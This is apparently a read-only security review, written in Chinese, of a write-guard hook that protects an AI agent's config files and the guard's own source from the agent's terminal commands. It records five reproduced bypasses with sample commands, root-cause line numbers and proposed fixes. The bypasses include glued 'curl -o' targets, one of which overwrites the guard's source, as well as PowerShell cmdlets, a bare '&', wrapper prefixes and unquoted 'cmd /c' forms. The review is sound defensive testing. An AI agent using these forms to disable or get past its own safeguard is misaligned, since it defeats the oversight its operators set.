# review-008-sec：write-guard round8 终审（安全路，只读）

- 评审人：sa-0（安全路）｜日期：2026-09-22｜基线：git 90de321 后 round8 修复版（handler.py 1173 行）
- 判据：reviews/round8-context.md + requirements/requirement-20260922-boundary.md。
  只在纳入范围 1-7 条内找新旁路；排除范围形态一律不立项（附录罗列）。
- 探针（本目录，全部落盘执行，命令行零载荷）：r8s_probe_a.py（重定向/输出参数/
  整词引号/链式续行）、r8s_probe_b.py（token 语义追踪/dd/exe 后缀/cmdlet/大小写）、
  r8s_probe_c.py（内嵌一层×常规写形态交叉、-t 族、execute_code os.system/subprocess）、
  r8s_probe_d.py（F-7-1/F-7-2 验收复测+红线）、r8s_probe_e.py（fd/& 重定向/wrapper/
  verbatim/FP 观察）。
- 基线复跑（实跑，非转述）：test_handler ALL PASS 29+4+250；_verify_r8 30/0、
  _verify_r7 30/0、_verify_r5 28/0、_verify_r3 25/0——与 fix-008 §6 记录一致，
  既有锁不回潮。

## 一、验收面结论（round8 修复项复测）

| 项 | 复测形 | 实测 | 判定 |
|---|---|---|---|
| F-7-1 | `cp evil `+bs+LF / bs+CRLF+守卫 handler | approve / approve | ✅封 |
| F-7-1 | `echo a`+2bs+LF+`cp evil GUARD` | approve | ✅盲替换误并旁路已闭 |
| F-7-1 | 双引号内 bs+LF、3bs/4bs、劈 token | PASS/PASS/approve/PASS | ✅与登记方向一致（奇偶族两形与 TC 形态不同但各自 POSIX 正确，见附录） |
| F-7-2 | `cp '--target-directory'=` / `"…"` + GUARD | approve / approve | ✅；workspace 负例 PASS |
| 红线 D | gateway bs+LF / bs+CRLF restart | block / block | ✅同源封堵 |

## 二、发现（纳入范围新旁路，全部实测复现；级别=对守卫义务面影响）

### S-1（HIGH）输出标志粘连短形 `-o<file>` / `-O<file>` 旁路 —— 纳入§1/§4点名词形
- 复现（实测 PASS）：
  - `curl -oD:/myagent/.hermes/config.yaml http://x`
  - `curl -sSL -oD:/myagent/.hermes/config.yaml http://x`（与常规前导选项组合）
  - `wget -oD:/myagent/.hermes/config.yaml http://x`、`sort -oD:/myagent/.hermes/config.yaml d.txt`
  - 内嵌一层同陷：`bash -c "curl -oD:/…/config.yaml http://x"` → PASS
  - 守卫源码直写：`curl -oD:\myagent\.hermes\plugins\write-guard\handler.py http://x` → PASS
- 判据依据：范围文档§纳入 4 **逐字**列出 `-o<file>`；且该词族 `-t<dir>` 已在 Q-6-1
  修——同判据族内两修一漏。
- 根因定位：`_OUTPUT_FLAG_RE`（L584-585，锚定 `\s*(?:=\s*)?$` 只命中独立选项词）、
  `_OUTPUT_FLAG_EQ_RE`（L586-587，仅认 `=` 粘连）；无值粘连提取分支——粘连 token
  非选项词（startswith - 即排除，L598）也非路径词归一命中。对照：`-o` 带空格、
  `--output=`、`--output ` 全封（L1084-1094 TC 锁），仅缺 `-oD:/…` 粘连形。
- 修法方向：仿 _GLUED_T_RE（L260/L872）加 `_OUTPUT_GLUE_RE` 提取 value 进 norm +
  before 认粘连选项词；≤6 行、零新解析层（灰区判据通过）。

### S-2（MED）PowerShell 复制/落盘 cmdlet（Copy-Item/Tee-Object）零覆盖 × 已实装载体 —— 纳入§1×§5
- 复现（实测 PASS）：
  - `pwsh -Command "Copy-Item evil D:/myagent/.hermes/config.yaml"`
  - `pwsh -Command "Tee-Object -FilePath D:/myagent/.hermes/config.yaml"`
- 判据依据：§5 内嵌一层载体（pwsh -Command）为纳入范围且 M-1 已实装；§1 cp 同义
  写形态（Copy-Item=cp、Tee-Object=tee 为 PS 原生对应词）。Set-Content/Add-Content/
  Out-File 同载体同引号形实测 block（F-A6 通道畅通）——差集仅在词表，非通道问题。
  CHANGELOG/代码零登记此两词（grep 0 命中）=未声明缺口非接受边界。
- 根因定位：`_PS_WRITE_RE`（L252）词表只收三 cmdlet；cmdlet 名不在 _COPY_CMDS 表
  （L577），矩阵 cmd 提取（L660）不命中复制分支。
- 修法方向：词表扩 `(?:Set-Content|Add-Content|Out-File|Copy-Item|Tee-Object)`；
  位参语义（-Destination）按"受保护路径在 cmdlet 后=写目标"现口径不扩。1 行正则。

### S-3（MED）cmd 原生单 `&` 链式分隔符不在分段集 —— 纳入§2（Windows 平台常规链）
- 复现（实测 PASS）：
  - `echo x > D:/myagent/workspace/a.txt & cp evil D:/myagent/.hermes/plugins/write-guard`
  - `echo x & cp evil D:/myagent/.hermes/plugins/write-guard`（裸 & 版同样旁路）
  - 对照：`&&`/`;`/换行 同载荷全 approve（L4 探针实测）
- 判据依据：§2"常规链式"以 shell 分隔语义为准；本插件部署/使用面是 Windows
  （terminal 工具可路由 cmd/pwsh），`&` 是 cmd 唯一的多命令串联符，非冷知识形。
  `>NUL` 前段同时演示了"前段吃掉守卫词表"的复合放大。
- 根因定位：`_judge_terminal` 分段集（L800 `("||","|")`、L805 `("&&","||",";","\n","\r")`）
  无单 `&`；`_PATH_TOKEN_RE`（L563）把 `&` 当 token 边界 → cp 段永不成段、路径词
  也被切断，双重失效。
- 修法方向：分段集加 `&`（降序位：`&&` 先于 `&`，_split_shell 已按长度降序消费）。
  已知代价：`2>&1` 类会被裂段——实测 `echo x 2>&1 > CFG` 因真实 `>` 在后仍 block，
  但 `type f 2>&1|tee CFG` 依赖管道段（实测 block）；需补"段首残留 `N>`/`>&` 尾"
  拼接防 FP，总体 ≤5 行。灰区判据通过。

### S-4（MED）命令前导词污染：常见 wrapper 与环境赋值前缀 —— 纳入§1/§5（Windows 高频+常规 shell）
- 复现（实测 PASS；载荷 `cp evil <guard目录>`，对照裸 `cp evil <guard>` approve）：
  - `runas /user:admin cp evil D:/myagent/.hermes/plugins/write-guard`
  - `cmd /c cp evil D:/myagent/.hermes/plugins/write-guard`（裸形无引号，联动 S-5）
  - `sudo cp evil D:/myagent/.hermes/plugins/write-guard`
  - `LANG=C cp evil D:/myagent/.hermes/plugins/write-guard`（环境赋值前缀形）
- 判据依据：§1 cp 常规位参 + §6 同语义必防；`runas` 是 Windows 原生提权词（本机
  部署面），`sudo/time/env` 属"人类会写的常规前缀"档（范围文档定位=拦无心之失，
  此类载荷不构成"研究 shell 冷知识"门槛）。`cmd /c cp …` 裸形与 §5 载体直接相关。
- 根因定位：`_command_word`（L603-608）只取段首词；`LANG=C`/`runas` 令 cmd ∉
  _COPY_CMDS → 末位目标收集（L890）与 -t 分支（L681）全关。
- 修法方向：前导词剔除表（`sudo/time/env/nohup/runas` + `X=Y` 形）+ 迭代取下一词，
  ≤5 行、零新解析层；FP 代价：`env | grep config` 负例实测放行不受影响（env 段无
  受保护路径词）。

### S-5（MED）载体裸形（无引号命令体）不递归 —— 纳入§5（`cmd /c …`/`pwsh -Command …` 点名词形）
- 复现（实测 PASS；对照同载荷**加引号**形全命中，探针 C/D 实测）：
  - `cmd /c copy evil D:/myagent/.hermes/config.yaml` → PASS（引号版 → approve）
  - `cmd.exe /c copy evil D:\myagent\.hermes\plugins\write-guard\handler.py` → PASS
  - `pwsh -Command Copy-Item evil D:/myagent/.hermes/config.yaml` → PASS（引号版同词= S-2）
  - `cmd /q /c copy evil D:/myagent/.hermes/config.yaml`（前导开关位序变体）→ PASS
- 判据依据：§5 逐字列 `cmd /c …`、`pwsh -Command` 形态；无引号裸体是人类第二
  高频写法（单目标路径无空格时根本不会想起来加引号），引号版封死而裸形全漏=
  同语义形态差（§6"同语义必防"精神）。
- 根因定位：`_EMBED_SHELL_RE`（L312-317）`(?P<q>['\"])(?P<body>.*?)(?P=q)\s*$`
  **强制引号包裹命令体**；裸形不匹配 → 不递归。cmd 词本身不在 _COPY_CMDS，
  段矩阵按 `cmd` 命令词走，写分支全关。
- 修法方向：carrier 词命中且无引号体时，剥前导载体词（`cmd/powershell/pwsh/sh`
  + `/c|/k|-c|-Command|-lc` 与开关位）后以剩余文本递归 `_judge_terminal`；≤5 行、
  复用现有递归与深度门（_NEST_DEPTH_LIMIT），零新解析层。

## 三、灰区裁决与分级说明

| # | 族 | 判据条文 | 级别 | 一句话理由 |
|---|---|---|---|---|
| S-1 | `-o<file>` 粘连 | §纳入4 逐字点名 | HIGH | 点名词形+同族 -t 已修；守卫源码可 curl 直缴械 |
| S-2 | PS cmdlet | §纳入5 载体 × §纳入1 词 | MED | 通道已实装仅词表缺集，1 行可修 |
| S-3 | 单 & | §纳入2 链式（平台语义） | MED | Windows 原生串联符，复合载荷放大 |
| S-4 | 前导词 | §纳入1/5 常规形 | MED | 高频 wrapper 白名单可收敛 |
| S-5 | 载体裸形 | §纳入5 点名词形（裸/引号同语义） | MED | 引号版封死裸形全漏，剥词递归可修 |

误拦侧：本轮未新增纳入范围误拦（纳入内误拦=缺陷的核查覆盖：cat/type 读守卫、
workspace 写、非 home `-t` 引号形、rsync -t 纯读——实测全放行；`cp '-t' <CFG> out/`
F-7-3 保守弹卡=已登记接受、方向 fail-closed）。`curl -O <URL含home路径>` 弹卡属
F-7-3 同族保守方向（-O 语义=URL basename 落 cwd，判定保守过收），不立项。

## 四、附录：排除范围形态实测登记（一律不立项）

1. 引号劈 token：`cp -'t'GUARD evil` → PASS（TC-R8-08 已锁现状）。
2. 反斜杠奇偶族：`cp evil 4bs+LF GUARD` → PASS、3bs+LF → approve（POSIX 正确语义，
   TC-R8-06/07 锁）；本探针 `echo a`+3bs+NL+cp… → PASS（echo 转义对消耗 2bs 后
   末 bs+LF 粘连、段首 `echo a\GUARD` 无写语义=族内又一形，登记不修）。
3. 双引号内续行：`echo "a\<LF>GUARD"` → PASS（TC-R8-04 锁；bash 双引号内续行=
   真换行，行为已正确，差异在判定视图，排除§2）。
4. 变量间接/eval：`a=cp; $a evil $b DIR`、`bash -c "echo \$((6+1))"`——未测即排除§3。
5. robocopy/xcopy/tar/ln 专属语义：排除§3；本探针 `xcopy evil GUARD /y` 类未立项。
6. 跨家 tilde：`echo x > ~/x` → PASS（F-Q5 登记，非本守卫 home 树内目标）。
7. verbatim 前缀双反斜杠形：`cp evil "\\\\?\D:\…"` → PASS（排除§2 反斜杠算术族+
   双引号转义表复合；真 verbatim 语义人类手写不可及）。
8. 反引号混排、编码混淆/base64：排除§2/§4。
9. 会话级 cd 漂移（M-3）：`cd ..` 相对链已实测正确（cd 跟踪 L809-821 block），
   残留登记不变。

## 五、验收面（round8 修复项复测结论，对照 round8-context §16-24）

- F-7-1：真续行 LF/CRLF → approve×2、2bs 分段旁路 → approve（已封）、3bs/4bs 锁向
  一致、gateway 两形 block——**修复工程质量验收通过**（helper L746-782 状态机、
  L799/L1120 两调用点同源、注释 L795-798 名实相符）。
- F-7-2：两引号形 `=`粘连 → approve×2、workspace 负例 PASS、-t 短词未扩（与
  fix-008 §2"勿扩"声明一致）——**验收通过**。
- CHANGELOG「全封」措辞：F-7-1 范围内声明与实测相符；但「round8 接受边界登记」
  节未预声明本轮 S-1~S-5 五族（属"新发现"非"失实"），定性为覆盖面缺口归缺陷本体。
- 基线数字：29+4+250 / 30 / 30 / 28 / 25 全复跑通过（见头部）。

## 六、裁决

**CHANGES REQUIRED** —— 纳入范围新旁路 5 条（HIGH×1：S-1 `-o<file>` 粘连；
MED×4：S-2 PS cmdlet、S-3 单 `&` 链、S-4 前导 wrapper 词、S-5 载体裸形），每条附
实测复现形与行号；排除范围附录 9 族登记，均不立项。修法全部落在"≤6 行、零新
解析层"灰区判据内；F-7-1/F-7-2 验收面与既有基线（29+4+250/30/30/28/25）复测
全绿，无回潮。

—— sa-0（安全路）2026-09-22 终审，全程只读；探针：本目录 r8s_probe_a~e.py。

